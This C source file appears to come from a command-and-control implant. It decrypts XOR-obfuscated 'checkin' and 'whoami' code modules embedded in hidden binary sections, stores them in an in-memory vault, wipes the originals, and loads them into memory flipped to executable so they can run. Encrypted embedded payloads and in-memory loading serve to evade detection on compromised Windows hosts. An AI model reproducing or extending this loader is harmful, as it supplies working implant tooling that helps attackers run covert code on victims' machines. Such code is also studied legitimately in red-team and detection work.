#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"

WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

char __CHECKIN_PICO__[0] __attribute__((section("pico_checkin")));
char __WHOAMI_PICO__[0] __attribute__((section("pico_whoami")));

WIN32FUNCS resolve_pico_functions() {
	WIN32FUNCS funcs;
	
	funcs.LoadLibraryA = (__typeof__(LoadLibraryA) *) KERNEL32$LoadLibraryA;
	funcs.GetProcAddress = (__typeof__(GetProcAddress) *) KERNEL32$GetProcAddress;
	funcs.VirtualAlloc = (__typeof__(VirtualAlloc) *) KERNEL32$VirtualAlloc;
	funcs.VirtualFree = (__typeof__(VirtualFree) *) KERNEL32$VirtualFree;
	
	return funcs;
}

char * find_checkin_pico() {
    return (char *)&__CHECKIN_PICO__;
}

char * find_whoami_pico() {
    return (char *)&__WHOAMI_PICO__;
}

BuiltinPicos load_builtin_picos(DataVault *vault, char *key) {
	BuiltinPicos picos = { 0 };

	picos.checkin = "_builtin_checkin";
	_EMBEDDED_PICO *checkin = (_EMBEDDED_PICO *) find_checkin_pico();
	char *raw_checkin = KERNEL32$VirtualAlloc(0, checkin->length, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	xorify(raw_checkin, checkin->value, checkin->length, key, XORKEY_LEN);
	add_to_vault(vault, picos.checkin, raw_checkin, checkin->length);
	for (int i = 0; i < checkin->length; i++) { checkin->value[i] = 0; }
	KERNEL32$VirtualFree(raw_checkin, 0, MEM_RELEASE);
	
	picos.whoami = "_builtin_whoami";
	_EMBEDDED_PICO *whoami = (_EMBEDDED_PICO *) find_whoami_pico();
	char *raw_whoami = KERNEL32$VirtualAlloc(0, whoami->length, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	xorify(raw_whoami, whoami->value, whoami->length, key, XORKEY_LEN);
	add_to_vault(vault, picos.whoami, raw_whoami, whoami->length);
	for (int i = 0; i < whoami->length; i++) { whoami->value[i] = 0; }
	KERNEL32$VirtualFree(raw_whoami, 0, MEM_RELEASE);
	
	return picos;
}

BOOL resolve_loaded_pico(DataVault *vault, WIN32FUNCS *funcs, ResolvedPico *pico, char *key) {
	DataBuffer databuf = { 0 };
	BOOL result = retrieve_from_vault(vault, &databuf, key);
	if (result == FALSE) { return FALSE; }
	
	char *buf = resolve_databuffer(vault, &databuf);
	
	// Note that buf is a pointer into the vault, which might become invalid if the vault is extended (reallocated).
	// It's the caller's responsibility to resolve the pico, invoke it, then free it BEFORE calling add_to_vault() again.
	
	pico->codelen = PicoCodeSize(buf);
	pico->code = KERNEL32$VirtualAlloc(NULL, pico->codelen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
	pico->datalen = PicoDataSize(buf);
	pico->data = KERNEL32$VirtualAlloc(NULL, pico->datalen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
	
	PicoLoad((IMPORTFUNCS *) funcs, buf, pico->code, pico->data);
	
	DWORD oldProtect;
	KERNEL32$VirtualProtect(pico->code, pico->codelen, PAGE_EXECUTE_READ, &oldProtect); 
	
	pico->entrypoint = PicoEntryPoint(buf, pico->code);
	
	return TRUE;
}

void free_resolved_pico(ResolvedPico *pico) {
	KERNEL32$VirtualFree(pico->code, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(pico->data, 0, MEM_RELEASE);
}
